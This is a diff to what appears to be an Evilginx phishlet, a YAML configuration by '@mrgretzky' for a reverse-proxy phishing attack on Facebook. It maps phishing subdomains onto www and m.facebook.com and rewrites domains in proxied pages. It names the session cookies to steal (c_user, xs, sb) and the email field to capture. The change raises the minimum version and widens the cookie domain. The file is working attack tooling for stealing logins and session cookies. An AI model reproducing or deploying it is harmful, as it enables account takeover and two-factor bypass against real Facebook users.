@@ -1,6 +1,6 @@
 name: 'facebook'
 author: '@mrgretzky'
-min_ver: '2.0.0'
+min_ver: '2.1.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
@@ -15,7 +15,7 @@ sub_filters:
   - {hostname: 'm.facebook.com', sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {hostname: 'static.xx.fbcdn.net', sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
 auth_tokens:
-  - domain: 'facebook.com'
+  - domain: '.facebook.com'
     keys: ['c_user','xs','sb']
 user_regex:
   key: 'email'
